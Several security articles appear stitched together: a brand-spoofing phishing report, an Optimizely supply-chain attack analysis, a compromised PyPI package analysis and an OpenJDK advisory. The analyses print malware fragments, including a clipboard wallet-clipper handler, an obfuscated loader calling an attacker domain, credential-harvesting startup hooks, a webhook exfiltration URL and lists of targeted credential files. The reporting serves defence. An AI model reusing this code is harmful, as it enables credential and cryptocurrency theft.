In credential phishing, Adobe has been used to host documents with links to malicious websites. Typically, PDFs with shortened links or QR codes obfuscate the credential phishing pages. In Adobe-spoofing campaigns delivering malware, the email usually claims a document is available to view.

After clicking on the phishing link and attempting to download the document, a website opens. The malicious website typically claims that Adobe Reader is out of date, and an update is necessary to see the PDF. Installing the file will deliver a legitimate RAT controlled by the threat actor. In these Adobe software update phishing campaigns, threat actors like to abuse tools such as ConnectWise’s ScreenConnect (ConnectWise RAT) and Datto RMM to take over the victim machine. For example, Figure 2 shows one website that claims Adobe Reader is out of date and downloads malware. Indicators of compromise (IOCs) for Figure 2 are listed in Active Threat Report (ATR) 415874. ATRs contain the context for each threat actor campaign, allowing current and similar campaigns to be blocked.

Social Security Administration Spoofing Campaigns Delivering Malware

Social Security Administration-spoofing is the second highest by campaign volume.

Campaign volume in the first half of 2025 is roughly equivalent to volume in the first half of 2026.

SSA-spoofing typically delivers ConnectWise RAT (55%), SimpleHelp (12%), and Faronics Deploy (9%).

Figure 3: Social Security Administration-spoofing email that bypasses email security technology to deliver ConnectWise RAT (ATR 417484).

In the United States, the Social Security Administration (SSA) becomes an important consideration near retirement age (at least age 62). For eligible members of the workforce, this pension information can dictate the lifestyle one lives after employment ends. Previous campaign iterations in Q4 2024 prioritized urgency and consequences when phishing. Current SSA-spoofing emails usually claim to provide information rather than demand it. Figure 3 shows an SSA download statement phishing email, one of the scams the SSA Office of the Inspector General warns about.

If the phishing link is clicked, an SSA-spoofing website typically opens, and a file download starts. The file appears similar to those in the Docusign and Adobe sections. Some files act like benefit letters or document notifications. Others require a download file to be run because “Adobe Reader is out of date”. As usual, running the file will install a threat actor-controlled legitimate RAT. The RATs most commonly installed are ConnectWise RAT and SimpleHelp. The SSA-impersonation campaign delivering ConnectWise RAT has been going on since at least 2024.

Docusign Spoofing Campaigns Delivering Malware

Docusign-spoofing emails increased about 250% when comparing the first half of 2026 to the first half of 2025.

Docusign-spoofing campaigns typically deliver ConnectWise RAT (34%), GoTo RAT (11%), Itarian RAT (5%), or some combination of the three.

Figure 4: Docusign-spoofing file is a SuperOps RMM instance abused by the threat actor (ATR 415883).

Docusign is typically used by threat actors to host documents with links to redirect to malicious websites, usually Microsoft-spoofing credential phishing pages. This is because using trusted websites help bypass email security technologies, and abusing legitimate business tools helps malicious content mimic benign content. Docusign-branded emails are also useful for getting recipients to download fake documents. Downloading the fake document will deliver malware instead of the expected file.

Threat actors will typically use the Docusign style for the email, the malware download website, and the filename. As seen in Figure 4, a malicious file is named like a Docusign attachment. Threat actors like to deliver legitimate RATs that they control, like ConnectWise RAT and GoTo RAT.

IRS Spoofing Campaigns Delivering Malware

IRS-spoofing email volume experienced a 10-fold increase when comparing the first half of 2026 to the first half of 2025.

IRS-spoofing campaigns typically deliver ConnectWise RAT (50%), Tiflux RAT (13%), Splashtop (13%) or some combination of the three.

Figure 5: IRS-spoofing, tax refund-themed phishing campaign delivering ConnectWise RAT (ATR 415954).

In the first half of 2025, IRS-spoofing campaigns delivering malware were most prevalent before the USA tax filing date on April 15. Now in the first half of 2026, threat actors continue to use the IRS brand in phishing emails past the tax filing deadline but with many themed about late filing deadlines. Well-developed phishing lures used after April 15 include a refund that has been processed or a tax filing extension being made available. As threat actors use current topics like Elon Musk and DOGE offering an IRS tax refund, IRS-spoofing campaigns are expected to increase.

As with the general rise in threat-actor abused legitimate RATs, IRS-spoofing campaigns deliver similar malware in most cases. ConnectWise RAT is once again the most popular RAT to be abused in IRS-spoofing campaigns. There is also a multi-stage campaign where Tiflux RAT is first installed, then Tiflux RAT installs Splashtop and an UltraVNC utility. In earlier group-delivered malware campaigns, the malware was primarily purpose-built for threat actors and entirely malicious. In the case of Tiflux RAT and Splashtop, both are developed by legitimate organizations for IT operations. Unfortunately, the instances of Tiflux RAT and Splashtop delivered in these campaigns are controlled by threat actors.

Zoom Spoofing Campaigns Delivering Malware

Zoom-spoofing emails delivering malware increased over 100% when comparing the first half of 2026 to the first half of 2025.

Zoom-spoofing campaigns typically deliver ConnectWise RAT (29%), TrustConnect (14%), and Atera (7%).

Figure 6: A fake Zoom website that downloads an abused RAT (ATR 416603).

Legitimate Zoom links can prompt users to download the Zoom app to access the meeting. Threat actors frequently spoof Zoom and hijack this expected behavior to trick users into downloading malware instead.

Zoom-spoofing phishing emails match the format of legitimate Zoom meeting emails, but the links will redirect to a malware download page instead of the legitimate Zoom site. The most prominent malware delivered is ConnectWise RAT again. TrustConnect and Atera are similar RATs abused by threat actors and delivered in Zoom-spoofing campaigns. Figure 6 shows a malicious Atera instance being downloaded from a threat actor’s website.

Problems Caused by Legitimate Remote Access Tool Abuse

As legitimate RATs are developed for enterprise use, abuse of these tools by threat actors may hide in plain sight.

ConnectWise RAT is currently the most abused legitimate RAT, instead of NetSupport Manager RAT.

When used for their intended purpose, legitimate remote access tools can reduce costs and improve efficiency. With legitimate RATs, IT professionals can easily maintain and monitor various devices across the organization without needing physical access to it. This elevated privilege becomes problematic when threat actors gain access to it.

Legitimate RATs are just as capable of purpose-built malware in the hands of a threat actor. With PowerShell commands, additional malware payloads can be installed after the initial RAT infection. Threat actors have used ConnectWise RAT to deliver ransomware before.

Organizations can find it hard to identify and contain legitimate RATs used by threat actors. Threat actors may even use the same RATs the organization uses, making context, continuous monitoring, and mitigative controls especially important. If the organization successfully contains one type of RAT, threat actors can easily use a different legitimate RAT for infections. In each of the brands spoofed in this report, threat actors already abuse various legitimate RATs.

Conclusions

This report shows five prominent brands spoofed by threat actors. Some key insights include malicious content nearly indistinguishable from legitimate brands, and the increasing abuse of legitimate remote administrative tools. These tactics by the threat actors can make it harder for both users and security analysts to determine if something is legitimate or not. Especially noteworthy are IRS-spoofing and Social Security Administration-spoofing phishing emails. IRS-spoofing emails will likely continue to increase even outside of tax filing season. Social Security Administration-spoofing emails already are not limited by a specific season.

Page Break

Mitigations

Establish and enforce a software allowlist for remote access tools. Any remote access tool not on that list, including ConnectWise, SimpleHelp, Atera, and GoTo RAT, should be blocked from installing on corporate devices. Organizations that do not have an allowlist should at minimum block the digital certificates associated with remote access tools they do not use.

Update employee security awareness training to reflect current lure themes, specifically Adobe document requests, SSA benefit notices, IRS refund emails, and Zoom meeting invitations. Employees who have been trained on real, current threats are more likely to pause before clicking. Simulation exercises should use these exact scenarios, not outdated generic examples.

Blocking remote access tools and updating training are essential, but threat actors will keep finding new brands, filenames, and legitimate tools to abuse. Organizations need a way to respond quickly when a campaign reaches the inbox or an endpoint. Title: Attackers Used Optimizely to A/B Test Malware on Top Websites
Context: At least 178 top web destinations unwittingly served a variety of malware exploits against visitors over the past 24 hours thanks to a security vulnerability involving...
Full Text:
At least 178 top web destinations unwittingly served a variety of malware exploits against visitors over the past 24 hours thanks to a security vulnerability involving Optimizely, a company that helps websites customize user experiences and test out new features. Experts say the incident, which saw data-stealing malicious software silently injected into sites like the BBC, CNN, Equifax, Ledger and Zoom, was exacerbated by the reality that few popular websites enforce strict rules on the sources of third-party content.

The Zoom.com homepage loading the malicious JavaScript file from Optimizely. Image: blog.report-uri.com. Click to enlarge.

According to a blog post from the security firm Report URI, on November 16 malicious JavaScript code was served to visitors of 178 organizations through Optimizely’s platform. Report URI researcher Scott Helme wrote that the payload delivered by the malicious Javascript was rebuilt 26 times during the day, dropping a multi-purpose malware kit that could steal payment card data, cookies and screenshots, and swap any cryptocurrency payment addresses for the attacker’s.

Helme noted the affected websites also served exploit code custom made to attack known vulnerabilities in older Apple iPhone and iPad devices. Known by such names as “DarkSword” and “Coruna,” these are zero-click exploit kits that chain together a half-dozen security holes to seize complete control over outdated devices and extract data.

“The important lesson here is that trusted JavaScript doesn’t always remain trustworthy,” Helme wrote. “A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.”

Contacted for comment, Optimizely said that on November 16, 2026 it “identified a security incident in which an unauthorized party exploited a vulnerability in the Optimizely Experimentation to add malicious JavaScript to some customer projects.”

“We acted swiftly to contain the incident and have fully remediated the identified vulnerability,” reads a written statement shared by Optimizely. “These measures included blocking access to the vulnerable path, deploying a fix, removing the injected code from affected projects, ending active sessions, revoking tokens, and resetting access for affected user accounts. We have also implemented additional protections to prevent malicious code from being delivered in Cloudflare. While the incident has been fully remediated, we are working with third-party experts on a comprehensive investigation.”

Many top web properties no longer fully display content unless visitors agree to let often dozens of third parties serve JavaScript, a powerful web scripting language that enables interactive content. JavaScript code is run on the user’s device, and it can read information displayed in the user’s browser and even modify a website’s appearance or content.

One reason JavaScript is so heavily used is that it enables fairly precise browser fingerprinting and other ways of tracking visitors and clicks. According to the 2025 Web Almanac by HTTP Archive, the median homepage loads at least 22 JavaScript files. But as the incident with Optimizely shows, a compromise at a third-party vendor’s website can quickly snowball into a supply chain attack against downstream websites that end up serving visitors tampered and malicious JavaScript files.

Zach Edwards is a researcher at Infoblox and the co-founder of the ad-tracking service DecryptAds. Edwards said Optimizely is a vendor which often collects data outside of consent flows, with their JavaScript snippets being embedded as close to the top of the page as possible to ensure that it’s one of the first things to render, which is important since the product is primarily built for A/B testing.

“So to make the product work as expected, this code is setup to fire immediately on-page load, and not restrict rendering behind a consent dialog box,” he said. “This means that this supply chain attack didn’t require any clicking or consent to trigger — most of the impacted clients would immediately serve up the payload as soon as someone loaded the page, further increasing risks from this type of JavaScript snippet being compromised.”

Websites can minimize the chances that a breach at a third-party content provider spirals into a supply chain attack by taking full advantage of “Content Security Policies” or CSPs, which specify the domain names that are allowed to serve third-party content. But Edwards said most websites — apart from perhaps the largest e-commerce, social media and financial platforms — don’t even bother with CSPs, or else tend to leave them overly permissive for marketing reasons.

“With literally all websites which embed 3rd party JavaScript resources, if you don’t have a content security policy then if any of those partners get compromised, new domains can be injected into your website via JavaScript which won’t be stopped,” he said. “We’re in the age of JavaScript supply chain attacks and yet almost no one is talking about why content security policies were invented and how this is largely the solution for operators, even though it’s not always simple to get it initially deployed.”

How broadly deployed were CSPs at the websites impacted by the Optimizely attack? According to Report URI, 68 of the sites had no CSP at all, while 50 of them had a CSP that still allowed the malware payload and the data theft. The company found only 24 of the affected sites (15 percent) had CSPs that fully blocked the malicious payload.

Image: blog.report-uri.com.

The overall deployment of CSPs across the Web’s busiest sites is somewhat lower — about 10 percent — according to Helme’s site crawler.ninja, which scans the top million websites daily for security issues. Helme said he hopes this incident will encourage more sites to adopt effective CSPs, noting that it could have been far worse: By Report URI’s estimates, the purveyors of this malware attack managed to steal only around $7,500 worth of virtual currency from affected users, as well as an unknown number of payment card records.

Helme said he often compares the current widespread lack of CSPs to the Wild West.

“Organizations are running all this code, but they don’t know what it’s doing,” Helme said in an interview with KrebsOnSecurity. “This is why we keep seeing such large scale breaches in places [where] there are no checks and rules in place on the code we’re running, so this was kind of inevitable. Once an attacker gets to the point of running code on your site, the question is what do they want to do with that and can they write the script to do it. Now with AI that’s not a problem anymore.”

Internet users can control the JavaScript elements allowed to run on webpages by using simple script-blocking plugins like NoScript. But these tools have always only been effective for diehard security and privacy nerds who are willing to put up with sifting through dozens of JavaScript requests on each new website.

Happily, modern ad blocking software can handily block most third-party JavaScript requests. Ten years ago, the standard security advice for end users was to install antivirus and enable a firewall. These days, your ad/script blocker is your firewall. We explored several options and approaches to blocking ads in our August 2026 story, Who’s Tracking You?

An attacker exploited a vulnerability in Optimizely's Web Experimentation platform on November 16, 2026, distributing malicious JavaScript through websites operated by some of the world's largest brands. Security researcher Scott Helme of Report URI identified 188 infected JavaScript snippets associated with 178 organizations, including the BBC, CNN, Zoom, GitLab, IKEA, and HSBC. The attack exposed website visitors to malware designed to replace cryptocurrency wallet addresses, steal payment information, and deliver iOS exploit kits.

Optimizely Web Experimentation is used for A/B testing and website personalization. Organizations using the service embed JavaScript snippets from Optimizely's content delivery network into their websites. These snippets include an optional Project JavaScript field that allows custom code to execute across pages. The attacker inserted malicious code into that field, which was then served through Optimizely's trusted infrastructure. The affected organizations did not need to have their own websites or servers compromised for the malicious scripts to reach visitors.

Optimizely confirmed that the attacker exploited a vulnerability in its Experimentation account signup flow. The company says it patched the vulnerability, removed the injected code, revoked tokens, reset access for affected accounts, and notified the organizations involved. Report URI subsequently confirmed that all infected snippets in its observed set had been cleaned by November 16 at 23:11 UTC.

Payload Analysis #

Affected snippets could load track.js from an attacker-controlled domain. StepSecurity also documented variants that hid the URL in base64 or carried the payload inline.

Affected website └── Optimizely customer snippet └── injected JavaScript └── 1688360[.]cc/track.js ├── cryptocurrency address clipper └── iOS boot.js loader

A copy of track.js from 1688360[.]cc was captured by the Internet Archive’s Wayback Machine on 16 November at 08:08:15 UTC. We decoded the sample statically; we did not execute it.

The capture timestamp precedes the 08:10 UTC first-build time reported in the published timeline. The Internet Archive’s index records the capture at 08:08:15 UTC, and its digest matches the compressed response we downloaded. The relationship between this capture and the 26 reported builds remains unconfirmed.

Size: 19,513 bytes SHA-256: 1ec4245b3b303304ea24a89b3b2351b0f0c085087050f517d23dcba9694c165a

The sample contains two encoded modules: a wallet clipper and an iOS loader. Static inspection did not identify the card-skimming module described in later versions.

Payload encoding

The outer file stores JavaScript modules in a configuration object. Each module’s code is a reversed base64 string. At runtime, the wrapper reverses the string, decodes it with atob(), and executes the decoded text using new Function():

(new Function( atob(encoded.split("").reverse().join("")) ))();

The sample’s decoded modules are 8,501 bytes and 312 bytes respectively.

Wallet clipper

The first module contains hard-coded Ethereum-style, Tron and Bitcoin replacement addresses:

var E = '0xC4026b06D82b0F0B363eda0642D61CfbDc17884e', T = 'THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa', B = '19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW';

It looks for matching addresses and replaces them using this function:

function F(s) { if (!s || s.length < 26 || !TS.test(s)) return s; return s.replace(RX, function (m) { var r = V(m); return r && r !== m ? r : m; }); }

The code validates Bitcoin and Tron candidates using checksum logic. For Ethereum-style candidates, it checks the 0x prefix and 40 hexadecimal characters; it does not perform an Ethereum checksum validation.

The clipper scans page text, inputs and textareas. It intercepts copy events and wraps the Clipboard API’s readText() and writeText() methods. A MutationObserver and a 50 ms interval help it revisit changing page content.

During a user-initiated copy, this handler can replace the copied text without a separate permission prompt. It does not read the clipboard’s previous contents; the wrapped Clipboard API methods remain subject to browser restrictions:

D.addEventListener('copy', function (e) { var t = ''; try { t = String(W.getSelection() || ''); } catch (x) {} if (!t || !TS.test(t)) return; var o = F(t); if (o !== t && e.clipboardData) { e.clipboardData.setData('text/plain', o); e.preventDefault(); } }, true);

iOS loader

The second module is restricted by the outer configuration to devices classified as iOS. It creates a script element that loads boot.js from 5vobauua3ojpklx[.]icu and sets:

data-channel-code="02111110" data-cfasync="false"

The Optimizely compromise shows how a single vulnerability in a widely used third-party service can expose visitors across hundreds of websites to malicious code. Third-party scripts can interact with sensitive page content and user activity, often with the same privileges as the website's own code. Organizations should reconsider whether experimentation and personalization scripts need to run across their entire sites, particularly on payment, account, and other sensitive pages.

Full Text:
Executive Summary #

The Microsoft agent-framework PyPI package was compromised on November 17th, affecting versions 1.26.1 and 1.26.2. Both versions install Python startup hooks that silently collect credentials, environment data, and cloud identity tokens, then exfiltrate them to a webhook[.]site endpoint. Avoid installing either version; if installed, remove them and rotate potentially exposed credentials.

Attack Analysis #

On Python startup, the .pth file imports a module that launches collection in a background process/thread. Version 1.26.1 routes through agent_framework_meta.pth → agent_framework_meta/**init**.py → agent_framework_meta/_telemetry.py; 1.26.2 uses af_runtime_diag.pth → af_runtime_diag.py.

The code gathers credential-related environment variables, local config/credential files, and other processes’ environments. It also requests cloud/workflow identity tokens (including Azure in both versions and GitHub Actions OIDC in 1.26.2). It serializes the results, compresses and Base64-encodes them, then POSTs them to the same concealed webhook.site endpoint: https[://]webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb

Version 1.26.1: startup hook → package initializer → collector.

agent_framework_meta.pth executes on interpreter startup through Python’s site processing:

import agent_framework_meta

agent_framework_meta/__init__.py adds a supposedly diagnostic hook that imports and starts the payload, suppressing errors:

# Lightweight runtime diagnostics hook try: from . import _telemetry as _telemetry _telemetry._start() except Exception: pass

agent_framework_meta/_telemetry.py collects credentials asynchronously. Its startup guard is inherited by child processes; on Unix, it forks and detaches. Platforms without fork use a daemon thread.

def _start(): if os.environ.get("_AF_TEL"): return os.environ["_AF_TEL"] = "1" try: if hasattr(os, "fork"): pid = os.fork() if pid == 0: try: os.setsid() except Exception: pass _run() os._exit(0) return

Fresh process trees can trigger collection again; there is no persistent on-disk execution marker.

Version 1.26.2: relocated payload and expanded GitHub targeting.

af_runtime_diag.pth replaces the original startup hook with a single line that imports the new top-level payload:

import af_runtime_diag

af_runtime_diag.py starts collection on import. The legitimate package initializer is restored byte-for-byte, so inspecting only agent_framework_meta/__init__.py misses this version. The collector adds GitHub Actions OIDC token requests:

u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or "" t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") or os.environ.get("ACTIONS_RUNTIME_TOKEN") or "" if u and t: for aud in ("api://AzureADTokenExchange", "<https://management.azure.com/>"):

Both collectors harvest and exfiltrate secrets.

They inspect environment variables, other processes’ environments, credential files, and cloud identity endpoints. They actively request fresh Azure managed-identity and CI federation tokens rather than merely copying existing secrets.

Both payload modules contain the same encoded destination:

_ENC = "aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi"

Collected JSON is zlib-compressed, base64-encoded, and POSTed to the decoded webhook with ?t=telemetry. Encoding provides no confidentiality beyond HTTPS. The reported payloads do not download or execute additional code.

Targeted Credentials #

Environment secrets: substring-based matching, not a fixed variable allowlist. Reported selectors include TOKEN, SECRET, KEY, AZURE, AWS, GITHUB, OPENAI, HF_, FOUNDRY, TENANT, CLIENT, and MANAGED. Version 1.26.2 adds ACTIONS, OIDC, RUNNER, and ARM_.

Other processes: /proc/*/environ, filtering for TOKEN, SECRET, PASSWORD, KEY=, SYSTEM_ACCESSTOKEN, and IDENTITY_HEADER; 1.26.2 also matches ACTIONS_ID_TOKEN.

Azure and Azure DevOps:

IDENTITY_ENDPOINT and identity headers; Azure IMDS managed-identity tokens.

SYSTEM_ACCESSTOKEN and SYSTEM_OIDCREQUESTURI for Azure DevOps federation tokens.

Azure JSON files: ~/.azure/*.json, ~/.azure/*/*.json (both expanded with os.path.expanduser), /home/*/.azure/*.json, /home/*/.azure/*/*.json, and /root/.azure/*.json.

Azure DevOps agent credential patterns in both versions:

/home/*/_work/*/.credentials /home/*/*/_work/*/.credentials /usr/local/vss-agent/*/.credentials /vss-agent/*/.credentials /home/*/.credentials /mnt/azure_nvme_temp/_work/*/.credentials /mnt/azure_nvme_temp/_work/*/*/.credentials

1.26.1 also targets /agent/_work/*/.credentials.

Token audiences include Azure management, AI/ML, Cognitive Services, Storage, Key Vault, Search, Microsoft Graph, Container Registry, Azure DevOps, and Azure AD token exchange.

GitHub Actions—expanded in 1.26.2:

ACTIONS_ID_TOKEN_REQUEST_URL, ACTIONS_ID_TOKEN_REQUEST_TOKEN, and fallback ACTIONS_RUNTIME_TOKEN.

OIDC tokens for api://AzureADTokenExchange and https://management.azure.com/.

Added file patterns: /home/runner/work/_temp/*, /home/runner/.azure/*.json, and /home/runner/.azure/*/*.json.

Other credential/configuration patterns—both versions:

pip: /home/*/.config/pip/pip.conf, /etc/pip.conf, /home/*/.pip/pip.conf.

npm: /home/*/.npmrc, /root/.npmrc.

netrc: /home/*/.netrc, /root/.netrc.

Git: /home/*/.git-credentials, /root/.git-credentials.

Docker: /home/*/.docker/config.json, /root/.docker/config.json.

Hugging Face: /home/*/.cache/huggingface/token, /home/*/.huggingface/token.

Foundry: /home/*/.foundry/*, /home/*/.config/foundry/*.

Configuration tokens: /home/*/.config/*/token*.json, /root/.config/*/token*.json.

Application files: /app/.env, /app/*.env, /app/*.json, /workspace/.env, /workspace/*.json.

Title: Critical Insights on OpenJDK RCE Vulnerability CVE-2026-114938
Context: A critical OpenJDK vulnerability, tracked as CVE-2026-114938, can allow an attacker to inject and remotely execute arbitrary code without authentication or user interaction
Full Text:
TL;DR

Calif disclosed Java4Shell, tracked as CVE-2026-114938, as an unauthenticated remote code execution vulnerability in OpenJDK.

The flaw is in the Java runtime's Base64 decoding path, not a third-party library. Reachability depends on the runtime build, processor, and whether an application decodes untrusted Base64 data.

Oracle released updated Java builds as part of its November 2026 security update, but its pre-release notice does not map those Java fixes to this CVE by name.

Finding exposure requires checking runtimes on hosts and in container images. Project dependency scans alone will not identify every affected system.

For the current advisory and response guidance, see our Security Event page for the Critical OpenJDK Vulnerability.

A critical OpenJDK vulnerability, tracked as CVE-2026-114938, can allow an attacker to inject and remotely execute arbitrary code without authentication or user interaction. Calif calls the vulnerability Java4Shell.

The disclosure coincided with Oracle's Java security update on November 17, 2026. That timing has raised questions about which Oracle builds address Java4Shell and what organizations should check.

Teams need to identify vulnerable runtimes across their environments, prioritize network-accessible systems, and apply the patched OpenJDK build through the appropriate vendor.

Java4Shell Is a Runtime Vulnerability, Not a Library Flaw

Java4Shell is a memory corruption vulnerability in the Java runtime itself, not in a third-party library or framework. Because the flaw sits in the runtime, project dependency scans will not identify every affected installation.

Base64 decoding is common in applications that receive data over a network. Our research indicates that a Java 17 application could, in principle, be reachable when it decodes Base64 data from an untrusted source on an affected runtime build and processor.

That does not mean every Java application is exposed in the same way. The runtime build and processor matter, as does whether untrusted input can reach the decoder. The vulnerability is described as pre-authentication, because an attacker may be able to supply that input before logging in or interacting with the application.

Third-party analysis has also reported affected Java versions beyond Java 17. Upwind says it reproduced the memory corruption in tests on Java 17, 21, and 25, and identified Java 27 through code analysis. These are research findings, not a vendor's final affected-version list. Organizations should use vendor guidance to confirm the status of each runtime they operate.

Oracle's November Update Does Not Define the CVE’s Full Scope

Oracle released updated Java builds as part of its November 17 security update. Its November security notice lists 11 Java SE security fixes, all described as remotely exploitable without authentication, with a maximum CVSS 3.1 score of 8.1. Oracle also lists builds for Java SE 8, 11, 17, 21, 25, and 27, along with versions of GraalVM and JavaFX.

The notice is a pre-release announcement and does not identify the 11 issues by CVE. It therefore does not establish which update addresses Java4Shell. The Java versions Oracle lists as affected should not be treated as the confirmed affected-version range for this CVE.

Early coverage reports a 9.2 score for Java4Shell under CVSS 4.0. Oracle reports a maximum score of 8.1 under CVSS 3.1 for its Java SE fixes. Those scores use different CVSS versions and refer to different sets of vulnerabilities. They are not competing scores for the same confirmed issue.

Patch Confirmed Systems and Reduce Exposure

Treat systems confirmed to run a vulnerable OpenJDK build as exposed until the patched runtime is installed. Apply the update supplied by the vendor or distribution responsible for that runtime. Build numbers can vary across distributions, so confirm the fixed version with the supplier rather than assuming a particular version string applies everywhere.

Replacing runtime files on a host does not update a JVM process that is already running. Restart affected services after updating. Rebuild container images using a patched base image, and update products that bundle their own Java runtime. Then verify that the deployed service is running the patched build.

If a product bundles the vulnerable runtime and has no direct upgrade path, contact its maintainers for an update. If no update is available, investigate an alternative component or a mitigating control while tracking the issue to resolution.

Calif’s recommendations describe two possible temporary mitigations: disabling the Base64 intrinsic or limiting AVX use to version 2. The AVX setting applies only to x86-64 hosts. OpenJDK on ARM does not recognize it and may fail to start. These controls are not replacements for a patched runtime. Test them for compatibility and performance impact, and follow the relevant vendor's guidance.

What Teams Should Do Now

Organizations should:

Inventory runtimes: Check the Java runtime used by each running service, including runtimes on hosts, in container images, and bundled with products. Record the build, vendor, processor, deployment location, and owner. Package inventories can help, but they do not replace checking the runtime a service actually uses.

Assess reachability: Check for the relevant AVX-512 processor support and whether the Java Base64 intrinsic is enabled. Identify which Java services listen for network connections.

Prioritize exposure: Start with internet-facing and other network-accessible systems, then review the rest of the environment.

Confirm and apply the fix: Check Oracle or the relevant OpenJDK supplier for the patched build that applies to each runtime. Restart affected services and rebuild images as needed.

Reduce interim risk: Restrict or monitor network access to confirmed vulnerable systems while updates are being applied. Test any temporary mitigation and follow vendor guidance.

Connect Vulnerability Intelligence to Runtime Inventory

Java4Shell is a reminder that vulnerability response depends on knowing what runs across the environment, including the runtimes beneath applications.

CVE-2026-114938 requires organizations to look beneath project dependencies and account for the runtime installed across their environments. Finding each vulnerable OpenJDK build, assigning an owner, and verifying the patch are essential steps in reducing exposure.

Check Sonatype Guide and the associated Security Event page, which contain current details and response guidance as organizations identify affected OpenJDK deployments and verify remediation.
